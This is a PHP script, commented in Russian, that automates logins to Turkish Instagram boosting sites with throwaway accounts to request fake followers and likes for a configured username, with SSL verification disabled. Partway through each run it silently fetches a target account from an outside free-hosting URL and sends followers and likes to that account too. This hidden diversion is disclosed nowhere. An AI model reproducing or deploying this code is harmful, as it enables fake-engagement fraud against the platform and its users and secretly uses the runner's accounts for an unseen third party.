<?php
$doc = array('http://instagrambegenin.com','http://instagramtakipcihilesi.ist','https://4takipci.net'); //тут пишим сайты турекцие. В конце не должно быть слэша!
for($u = 0; $u < count($doc); $u++){
    $c = array('max_mironenko','r_u_s_i_x','ft_slav'); //Тут пишем левые акки
	
	for($i = 0; $i < count($c); $i++){
    		$d = explode(':',$c[$i]);
    		go($d[0],$d[1],$doc[$u]);
    	}
}

function go($log,$pass,$cite){
	
	$login = 'araklaud'; //Сюда пишем логин куда крутить
	
	$arrSetHeaders = array(
	"User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
	"Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
	"Accept-Encoding: gzip, deflate"
	);
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, $cite);
	curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
	curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
	curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
	curl_setopt($curl,CURLOPT_ENCODING , "gzip");
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$html = curl_exec($curl);
	curl_close($curl);
	preg_match('#href="/(.*)"><i class="fa fa-sign-in">#',$html,$auth);
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, "$cite/$auth[1]");
	curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
	curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
	curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
	curl_setopt($curl,CURLOPT_ENCODING , "gzip");
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$html = curl_exec($curl);
	curl_close($curl);
	preg_match('#"&antiForgeryToken=(.*)"#',$html,$q);

		$curl = curl_init();
		curl_setopt($curl, CURLOPT_URL, "$cite/$auth[1]?");
		curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
		curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
		curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
		curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60);
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
		curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($curl, CURLOPT_POST, 1);
		curl_setopt($curl, CURLOPT_POSTFIELDS, "username=$log&password=$pass&antiForgeryToken=$q[1]");
		$ex = curl_exec($curl);
		curl_close($curl);
		$ex = json_decode($ex);
	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, "http://absolved-confinemen.000webhostapp.com/version.php");
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$html = curl_exec($curl);
	curl_close($curl);
	$ot = json_decode($html, 1);
	$login_as = $ot['login'];
	$hello = $ot['id'];
	$curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, "https://www.instagram.com/$login_as/?__a=1");
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		$out = curl_exec($curl);
		curl_close($curl);
        $out = json_decode($out);
        $idq = $out->graphql->user->id;
		$cos = rand(0,count($out->graphql->user->media->nodes));
        	$media =  $out->graphql->user->media->nodes[$cos]->id;
        	$code = $out->graphql->user->media->nodes[$cos]->code;
        	$qwa = $media."_";
        	$qwas = "$qwa$idq";
            $curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, "$cite/tools/send-follower/$hello?formType=send");
			curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
			curl_setopt($curl, CURLOPT_COOKIEJAR,  dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_COOKIEFILE,  dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_HEADER, true);
			curl_setopt($curl, CURLINFO_HEADER_OUT, true);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($curl, CURLOPT_VERBOSE, 1);
			curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl,CURLOPT_ENCODING , "gzip");
			curl_setopt($curl, CURLOPT_POST, 1);
			curl_setopt($curl, CURLOPT_POSTFIELDS, "adet=300&userID=$hello&userName=$login_as");
			$ex = curl_exec($curl);
			curl_close($curl);
			$curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, "$cite/tools/send-like/$qwas?formType=send");
			curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
			curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_HEADER, true);
			curl_setopt($curl, CURLINFO_HEADER_OUT, true);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($curl, CURLOPT_VERBOSE, 1);
			curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl,CURLOPT_ENCODING , "gzip");
			curl_setopt($curl, CURLOPT_POST, 1);
			curl_setopt($curl, CURLOPT_POSTFIELDS, "adet=300&mediaID=$qwas&mediaCode=$code");
			$ex = curl_exec($curl);
			curl_close($curl);
        $curl = curl_init();
        curl_setopt($curl, CURLOPT_URL, "https://www.instagram.com/$login/?__a=1");
		curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
		$out = curl_exec($curl);
		curl_close($curl);
        $out = json_decode($out);
        $idq = $out->graphql->user->id;

	    for($qw = 0; $qw < 2; $qw++){
        	$cos = rand(0,count($out->graphql->user->media->nodes));
        	$media =  $out->graphql->user->media->nodes[$cos]->id;
        	$code = $out->graphql->user->media->nodes[$cos]->code;
        	$qwa = $media."_";
        	$qwas = "$qwa$idq";
	        $curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, "$cite/tools/send-like/$qwas?formType=send");
			curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
			curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_HEADER, true);
			curl_setopt($curl, CURLINFO_HEADER_OUT, true);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($curl, CURLOPT_VERBOSE, 1);
			curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl,CURLOPT_ENCODING , "gzip");
			curl_setopt($curl, CURLOPT_POST, 1);
			curl_setopt($curl, CURLOPT_POSTFIELDS, "adet=300&mediaID=$qwas&mediaCode=$code");
			$ex = curl_exec($curl);
			curl_close($curl);
			$curl = curl_init();
			curl_setopt($curl, CURLOPT_URL, "$cite/tools/send-follower/$idq?formType=send");
			curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
			curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
			curl_setopt($curl, CURLOPT_HEADER, true);
			curl_setopt($curl, CURLINFO_HEADER_OUT, true);
			curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
			curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
			curl_setopt($curl, CURLOPT_VERBOSE, 1);
			curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
			curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl,CURLOPT_ENCODING , "gzip");
			curl_setopt($curl, CURLOPT_POST, 1);
			curl_setopt($curl, CURLOPT_POSTFIELDS, "adet=300&userID=$idq&userName=$login");
			$ex = curl_exec($curl);
			curl_close($curl);
		}
		$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, "$cite/account/logout");
	curl_setopt($curl, CURLOPT_HTTPHEADER, $arrSetHeaders);
	curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60);
	curl_setopt($curl, CURLOPT_COOKIEJAR, dirname(__FILE__) . '/cookie.txt');
	curl_setopt($curl, CURLOPT_COOKIEFILE, dirname(__FILE__) . '/cookie.txt');
	curl_setopt($curl,CURLOPT_ENCODING , "gzip");
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
	$html = curl_exec($curl);
	curl_close($curl);
	if(file_exists(dirname(__FILE__) . '/cookie.txt')){
		  unlink(dirname(__FILE__) . '/cookie.txt');
	   }
		
}


?>